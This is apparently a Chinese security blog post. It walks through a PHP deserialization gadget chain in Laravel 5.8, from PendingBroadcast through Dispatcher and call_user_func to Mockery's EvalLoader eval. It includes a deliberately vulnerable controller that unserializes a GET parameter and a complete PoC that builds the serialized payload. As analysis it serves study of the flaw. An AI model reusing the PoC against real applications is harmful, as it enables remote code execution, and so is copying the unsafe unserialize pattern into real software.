> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/VTvlyDUxpZDqQup2wVQD7A)

版本:5.8.x

环境搭建：

php7.2.10

扩展phpopenssl

安装composer

composer 创建项目，优先下载压缩包

```
composer create-project --prefer-dist laravel/laravel blog 5.8.*
```

  

项目核心目录 app

框架核心目录 vendor

模型文件 控制器 app-》http-》controllers

入口文件 public-》index.php

视图 resources-》views

路由文件 route-》web.php

缓存日志文件 storage

  

首先添加一个反序列化路由：

```
`<?php` `Route::get("/","\App\Http\Controllers\DemoController@poptest");``?>`
```

添加一个控制器

```
`<?php namespace App\Http\Controllers;``highlight_file(__FILE__);``class DemoController extends Controller{` `public function poptest()``{` `if(isset($_GET['yh'])){` `$code = $_GET['yh'];` `unserialize($code);` `}` `return "laravel5.8 pop";` `\}\}`
```

 由于我太菜了 只能看懂一条链子 所以就只写这一条

pop：

我们一般会寻找wakeup 这个魔术方法 因为有unserialize执行就会触发，但是我们需要寻找发序列化入口，这里我们就不太方便，所以我们直接寻找destruct这个魔术方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法。

首先我们先找到一个入口点

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在57行处直接将当前类中的events属性设置为dispatcher类。

所以我们可让其上面的函数与下图的类联系起来，执行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在第73行处return一个结果跟进发现，在150行处存在call_user_func函数 回调函数 在php中回调函数可以代码执行。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

所以我们的思路就是要能进入这个if语句让其为true，执行下面的代码

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后跟进commandShouldBeQueued

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ShouldQueu是一个接口在php中我们只需要将$command为实现该接口的类就行，这样的话就能返回true。

现在能成功执行到call_user_func，那么我们可以调用任意类了。

这里选着EvalLoader类中的load方法。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

为里面有调用eval函数，且参数可控。接下来我们只要构造条件，使得eval函数前面的 if语句块不执行return即可。我们只要找一个有 getName方法的类，且返回结果可控即可。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

整条利用链

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

poc：

```
`<?php``namespace PhpParser\Node\Scalar\MagicConst{` `class Line {` `}``}``namespace Mockery\Generator{` `class MockDefinition` `{` `protected $config;` `protected $code;` `public function __construct($config, $code)``{` `$this->config = $config;` `$this->code = $code;` `}` `}``}``namespace Mockery\Loader{` `class EvalLoader{` `}``}``namespace Illuminate\Bus{` `class Dispatcher` `{` `protected $queueResolver;` `public function __construct($queueResolver)``{` `$this->queueResolver = $queueResolver;` `}` `}``}``namespace Illuminate\Foundation\Console{` `class QueuedCommand` `{` `public $connection;` `public function __construct($connection)``{` `$this->connection = $connection;` `}` `}``}``namespace Illuminate\Broadcasting{` `class PendingBroadcast` `{` `protected $events;` `protected $event;` `public function __construct($events, $event)``{` `$this->events = $events;` `$this->event = $event;` `}` `}``}``namespace{` `$line = new PhpParser\Node\Scalar\MagicConst\Line();` `$mockdefinition = new Mockery\Generator\MockDefinition($line,'<?php phpinfo();?>');` `$evalloader = new Mockery\Loader\EvalLoader();` `$dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));` `$queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);` `$pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);` `echo urlencode(serialize($pendingbroadcast));}``?>`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)